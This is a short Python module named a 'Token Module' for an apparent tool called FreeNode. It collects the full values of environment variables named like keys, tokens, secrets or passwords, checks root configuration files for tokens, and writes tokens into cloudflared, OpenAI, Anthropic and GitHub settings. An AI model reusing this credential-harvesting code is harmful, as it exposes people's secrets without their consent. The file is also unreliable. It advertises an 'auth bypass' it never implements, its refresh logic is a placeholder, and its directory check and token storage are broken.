"""
Token Module — API Token Capture, Refresh Management, Auth Bypass
"""

import subprocess
import os
import json
from typing import Optional, Dict, List

class TokenManager:
    """Manage API tokens for FreeNode"""

    def __init__(self):
        self.tokens = {}
        self.credentials_files = [
            "/root/.ssh/config",
            "/root/.bashrc",
            "/root/.profile",
            "/etc/environment",
        ]

    def capture_tokens(self, environment: str = "auto") -> dict:
        """Capture tokens from environment or config files"""
        captured = {}
        tokens_found = []

        # Capture from environment
        env_tokens = {
            k: v for k, v in os.environ.items() 
            if any(s in k.upper() for s in ['KEY', 'TOKEN', 'SECRET', 'PASSWORD', 'AUTH', 'CREDENTIAL'])
        }
        captured.update(env_tokens)

        # Scan config files for tokens
        for f in self.credentials_files:
            if os.path.exists(f):
                try:
                    with open(f, "r") as fh:
                        content = fh.read()
                    if "token" in content.lower() or "api_key" in content.lower():
                        tokens_found.append({"file": f, "has_token": True})
                except:
                    pass

        return {
            "status": "ok",
            "captured": list(env_tokens.keys()) if env_tokens else [],
            "files_with_tokens": tokens_found,
            "tokens": env_tokens,
        }

    def inject_token(self, token: str, service: str) -> bool:
        """Inject a token into target service"""
        try:
            if service == "cloudflare":
                # Store in cloudflared config
                config_path = "/root/.cloudflared/config.yml"
                if os.path.exists("/root/.cloudflared"):
                    os.makedirs("/root/.cloudflared", exist_ok=True)
                    with open(config_path, "w") as f:
                        f.write(f"credentials.json: '{token}'\n")
                return True
            elif service == "openai":
                os.environ["OPENAI_API_KEY"] = token
                return True
            elif service == "anthropic":
                os.environ["ANTHROPIC_API_KEY"] = token
                return True
            elif service == "github":
                # Use git credential helper
                os.environ["GIT_TOKEN"] = token
                return True
            return False
        except Exception:
            return False

    def refresh_token(self, token_type: str) -> str:
        """Attempt to refresh a token (placeholder — actual refresh logic platform-specific)"""
        refresh_map = {
            "cloudflare": "tunnel_token_refresh",
            "openai": "key_rotation",
            "github": "github_token_refresh",
            "anthropic": "api_key_rotation",
        }
        # Placeholder for actual refresh logic
        return f"refresh_{token_type}"

    def get_tokens(self) -> list:
        """Return all captured tokens (redacted)"""
        safe_tokens = {}
        for k, v in self.tokens.items():
            if len(v) > 8:
                safe_tokens[k] = f"{v[:8]}***{v[-4:]}"
            else:
                safe_tokens[k] = "****"
        return safe_tokens
